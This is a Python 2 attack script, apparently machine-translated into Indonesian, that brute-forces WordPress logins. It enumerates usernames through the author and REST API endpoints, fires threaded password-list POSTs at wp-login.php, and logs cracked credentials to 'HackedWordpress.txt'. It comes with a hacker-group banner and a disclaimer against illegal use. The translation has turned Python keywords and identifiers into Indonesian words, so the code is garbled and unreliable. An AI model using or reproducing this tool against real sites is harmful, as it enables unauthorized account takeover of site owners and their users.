impor threading, waktu, ulang, os, sys, json, acak


coba :

    permintaan impor

kecuali ImportError :

    cetak ' ------------------------------------------------ --- '

    cetak ' [*] kirim permintaan pemasangan pipa '

    cetak ' [-] Anda perlu menginstal Modul permintaan '

    sys.exit ()



'' '

Peretas Topi Putih

__ _______ ____ _ 

\ \ / / __ \ | _ \ | | 

\ \ / \ / / | | __) | | _) | _ __ _ _ | | _ ___

\ \ / \ / / | ___ / | _ <| '__ | | | | __ / _ |

\ / \ / | | | | _) | | | | _ | | || __ /

\ / \ / | _ | | ____ / | _ | \ __, _ | \ __ \ ___ |

IRAN-Cyber.Net github.com/04x 

Catatan! : Kami tidak Menerima tanggung jawab apa pun atas penggunaan ilegal apa pun. 

'' '

kelas WordPress_priv8Bf ( objek ):

    def __init__ ( mandiri ):

        diri .flag = 0

        diri .r = ' \ 033 [31m '

        diri .g = ' \ 033 [32m '

        diri .y = ' \ 033 [33m '

        diri .b = ' \ 033 [34m '

        diri .m = ' \ 033 [35m '

        diri .c = ' \ 033 [36m '

        diri .w = ' \ 033 [37m '

        diri .rr = ' \ 033 [39m '

        diri .cls ()

        self .print_logo ()

        situs = raw_input ( self .c + ' [ ' + self .y + ' + ' + self .c + ' ] ' + self .w + ' Target: ' + self .c)

        if site.startswith ( ' http: // ' ):

            site = site.replace ( ' http: // ' , ' ' )

        elif site.startswith ( ' https: // ' ):

            site = site.replace ( ' https: // ' , ' ' )

        lain :

            lulus

        cetak sendiri .c + ' [ ' + self .y + ' + ' + self .c + ' ] ' + diri .w + ' MULAI Proses BruteForce: ' \

              + diri .c + situs

        coba :

            agent = { ' User-Agent ' : ' Mozilla / 5.0 (X11; Ubuntu; Linux i686; rv: 28.0) Gecko / 20100101 Firefox / 28.0 ' }

            source = requests.get ( ' http: // ' + situs + ' /wp-login.php ' , batas waktu = 5 , header = agen) .text.encode ( ' utf-8 ' )

            cetak diri .c + ' [ ' + diri .y + ' + ' + diri .c + ' ] ' + diri .w + \

                  ' [Mencoba Mendapatkan Wp-login.php SourceCode] ' + self .g + ' [OK] '

            time.sleep ( 0.5 )

        kecuali :

            cetak sendiri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .w + \

                  ' [URL Tidak valid atau Timeout! atau Alamat Ip Anda Diblokir! ] '

            sys.exit ()


        coba :

            WpSubmitValue = re.findall ( ' class = "tombol-tombol utama-besar" value = "(. *)" ' , Sumber) [ 0 ]

            cetak diri .c + ' [ ' + diri .y + ' + ' + diri .c + ' ] ' + diri .w + \

                  ' [Mencoba Mendapatkan Nilai WpSubmit Dari SourceCode] ' + self .g + ' [OK] '

            time.sleep ( 0.5 )


        kecuali :

            cetak sendiri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .w + \

                  ' [Mencoba Mendapatkan Nilai WpSubmit Dari SourceCode] ' + self .r + ' [TIDAK] '

            sys.exit ()

        coba :

            WpRedirctTo = re.findall ( ' name = "redirect_to" value = "(. *)" ' , Sumber) [ 0 ]

            cetak diri .c + ' [ ' + diri .y + ' + ' + diri .c + ' ] ' + diri .w + \

                  ' [Mencoba Mendapatkan Nilai WpRedirctTo Dari SourceCode] ' + self .g + ' [OK] '

            time.sleep ( 0.5 )


        kecuali :

            cetak sendiri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .w + \

                  ' [Mencoba Mendapatkan Nilai WpRedirctTo Dari SourceCode] ' + self .r + ' [TIDAK] '

            sys.exit ()

        jika ' Masuk ' di WpSubmitValue:

            WpSubmitValue = ' Masuk + Masuk '

        lain :

            WpSubmitValue = WpSubmitValue

        usgen = diri .UserName_Enumeration (situs)

        jika usgen ! = ' ' atau usgen ! = Tidak ada :

            Nama pengguna = usgen

            time.sleep ( 1 )

            cetak diri .c + ' [ ' + diri .y + ' + ' + diri .c + ' ] ' + diri .w + \

                  ' Enumeration Username: ' + self .g + str (Nama pengguna) + self .g + ' [OK] '

        lain :

            coba :

                Nama pengguna = raw_input ( self .c + ' [ ' + self .y + ' * ' + self .c + ' ] ' + self .w +

                                     ' Nama Pengguna untuk Mulai bf: ' )

                jika Nama Pengguna == ' ' :

                    cetak sendiri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .w + \

                          ' [Nama Pengguna] ' + diri .r + ' [TIDAK] '

                    sys.exit ()

            kecuali :

                cetak sendiri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .w + \

                      ' [Nama Pengguna] ' + diri .r + ' [TIDAK] '

                sys.exit ()


        coba :

            password = raw_input ( self .c + ' [ ' + self .y + ' * ' + self .c + ' ] ' + self .w + ' masukkan daftar kata sandi: ' )

            dengan open (password, ' r ' ) sebagai xx:

                passfile = xx.read (). splitlines ()

            cetak sendiri .c + ' [ ' + self .y + ' + ' + self .c + ' ] ' + self .g + \

                  str ( len (passfile)) + self .c + ' Kata Sandi Dimuat! '

            time.sleep ( 2 )

        kecuali :

            cetak sendiri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .w + \

                  ' [Daftar kata sandi] ' + diri .r + ' [TIDAK] '

            sys.exit ()


        utas = []


        untuk passwd di passfile:

            t = threading.Thread ( target = diri .BruteForce, args = (situs, passwd, WpSubmitValue, WpRedirctTo, Username))

            jika diri .flag == 1 :

                istirahat

            lain :

                t.start ()

                thread.append (t)

                tertidur ( 0,08 )

        untuk j in thread:

            j.join ()

        jika diri .flag == 0 :

            cetak diri .c + ' [ ' + self .y + ' - ' + self .c + ' ] ' + diri .r + situs + ' ' \

                  + self .y + ' OpenCart ' + self .c + ' [Not Vuln] '


    def cls ( diri sendiri ):

        linux = ' jelas '

        windows = ' cls '

        os.system ([linux, windows] [os.name == ' nt ' ])


    def print_logo ( mandiri ):

        clear = " \ x1b [0m "

        warna = [ 36 , 32 , 34 , 35 , 31 , 37 ]


        x = "" "

Peretas Topi Putih

__ _______ ____ _ 

\ \ / / __ \ | _ \ | | 

\ \ / \ / / | | __) | | _) | _ __ _ _ | | _ ___

\ \ / \ / / | ___ / | _ <| '__ | | | | __ / _ |

\ / \ / | | | | _) | | | | _ | | || __ /

\ / \ / | _ | | ____ / | _ | \ __, _ | \ __ \ ___ |

IRAN-Cyber.Net github.com/04x 

Catatan! : Kami tidak Menerima tanggung jawab apa pun atas penggunaan ilegal apa pun. 

"" "

        untuk N, baris dalam enumerate (x.split ( " \ n " )):

            sys.stdout.write ( " \ x1b [1; % d m % s% s \ n " % (random.choice (warna), garis, jelas))

            time.sleep ( 0,05 )


    def UserName_Enumeration ( mandiri , situs ):

        _cun = 1

        Bendera = Benar

        __Check2 = requests.get ( ' http: // ' + situs + ' /? Penulis = 1 ' , batas waktu = 10 )

        coba :

            sementara Bendera:

                GG = requests.get ( ' http: // ' + situs + ' / wp-json / wp / v2 / users / ' + str (_cun), batas waktu = 5 )

                __InFo = json.loads ( GG .text )

                jika ' id ' tidak dalam __InFo:

                    Bendera = Salah

                lain :

                    Usernamez = __InFo [ ' name ' ]

                    mengembalikan Usernamez

                istirahat

        kecuali :

            coba :

                jika ' / penulis / ' tidak dalam __Check2.text:

                    return Tidak ada

                lain :

                    find = re.findall ( ' /author/(.*)/ " ' , __Check2.text)

                    username = find [ 0 ]

                    jika ' / beri makan ' dalam nama pengguna:

                        find = re.findall ( ' /author/(.*)/feed/ " ' , __Check2.text)

                        username2 = find [ 0 ]

                        kembalikan nama pengguna2

                    lain :

                        kembalikan nama pengguna

            kecuali requests.exceptions.ReadTimeout:

                return Tidak ada


    def BruteForce ( self , situs , passwd , WpSubmitValue , WpRedirctTo , Username ):

        agent = { ' User-Agent ' : ' Mozilla / 5.0 (X11; Ubuntu; Linux i686; rv: 28.0) Gecko / 20100101 Firefox / 28.0 ' }

        post = {}

        post [ ' log ' ] = Nama pengguna

        post [ ' pwd ' ] = passwd

        post [ ' wp-submit ' ] = WpSubmitValue

        posting [ ' redirect_to ' ] = WpRedirctTo

        post [ ' testcookie ' ] = 1

        url = " http: // " + situs + ' /wp-login.php '

        GoT = requests.post (url, data = posting, header = agen, batas waktu = 10 )

        cetak diri .c + ' [ ' + diri .y + ' + ' + diri .c + ' ] ' + diri .w + \

              ' Pengujian: ' + self .y + passwd

        jika ' wordpress_logged_in_ ' di str (GoT.cookies):

            cetak sendiri .c + ' [ ' + self .y + ' + ' + self .c + ' ] ' + \

                  self .y + situs + ' ' + self .y + ' nama pengguna: ' + self .g \

                  + Nama pengguna + self .y + ' Kata Sandi: ' + self .g + passwd

            dengan open ( ' HackedWordpress.txt ' , ' a ' ) sebagai penulis:

                writer.write ( ' http: // ' + situs + ' /wp-login.php ' + ' \ n Nama pengguna: admin ' + ' \ n Kata sandi: ' +

                             passwd + ' \ n ----------------------------------------- \ n ' )

            diri .flag = 1

